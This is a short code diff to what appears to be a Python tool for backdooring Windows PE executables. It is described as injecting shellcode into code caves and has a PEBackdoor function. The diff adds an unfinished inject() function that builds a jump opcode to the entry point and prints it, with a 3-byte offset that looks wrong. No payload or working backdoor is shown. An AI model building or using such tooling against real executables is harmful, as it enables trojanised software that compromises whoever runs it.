@@ -58,6 +58,13 @@ def info(file_name):
 
     print(pe.OPTIONAL_HEADER)
 
+def inject(file_name, shell_code, output, start):
+    to_jmp = start.to_bytes(3, 'big')
+
+    shellcode = bytes(b"\xE9") + to_jmp
+
+    print(shellcode)
+
 def interactive():
 
     parser = argparse.ArgumentParser(description="Inject shell code into code caves automatically")
@@ -84,7 +91,8 @@ def PEBackdoor(pe_path, shell_code, output):
     print("main function called")
     pe = pefile.PE(pe_path)
     original_start = pe.OPTIONAL_HEADER.AddressOfEntryPoint
-    print(original_start)
+    print(hex(original_start))
+    inject(pe_path, 'aa', 'aa', original_start)
     pe.close()
     caves = code_caves(150, pe_path)
     print(caves)
